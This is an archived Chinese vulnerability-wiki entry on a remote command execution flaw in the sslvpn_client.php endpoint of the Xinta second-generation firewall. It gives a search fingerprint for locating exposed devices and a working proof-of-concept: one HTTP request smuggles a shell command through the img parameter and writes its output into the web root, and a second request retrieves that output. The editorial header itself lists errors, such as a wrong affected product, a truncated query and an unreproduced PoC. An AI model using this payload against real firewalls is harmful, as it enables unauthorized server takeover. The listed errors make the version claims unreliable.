---
source: "wy876 漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "鑫塔第二代防火墙sslvpn_client存在远程命令执行漏洞"
product: "鑫塔第二代防火墙"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "影响版本误写博达下一代防火墙；缺响应版本修复及写文件清理"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E9%91%AB%E5%A1%94%E7%AC%AC%E4%BA%8C%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99sslvpn_client%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
fofa_unverified: "web.body="
hunter: "web.body=\"欢迎登录鑫塔第二代防火墙\""
source_url: "https://www.yuque.com/xiaokp7/ocvun2/du84v1279q9b4hgp"
id: "vw-259bc3f97182c7bf4c735a44"
entity_id: "ve-259bc3f97182c7bf4c735a44"
schema_version: "1"
---

# 鑫塔第二代防火墙sslvpn_client存在远程命令执行漏洞

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：鑫塔第二代防火墙
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：影响版本误写博达下一代防火墙；缺响应版本修复及写文件清理
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 影响版本误写博达下一代防火墙
2. Hunter表达式误存FOFA且web.body=截断
3. 与迈普博达同PoC无各产品实测证据
4. 缺响应版本修复及写文件清理
5. HTTP误标java

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://www.yuque.com/xiaokp7/ocvun2/du84v1279q9b4hgp>

### 归档技术正文

# 一、漏洞简介
鑫塔第二代防火墙sslvpn_client存在远程命令执行漏洞，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 博达下一代防火墙

# 三、资产测绘
+ hunter`web.body="欢迎登录鑫塔第二代防火墙"`
+ 特征


# 四、漏洞复现
```http
GET /sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt|ls HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


获取命令执行结果

```http
GET /sslvpn/ceshi.txt HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Host: xx.xx.xx.xx
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/du84v1279q9b4hgp>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
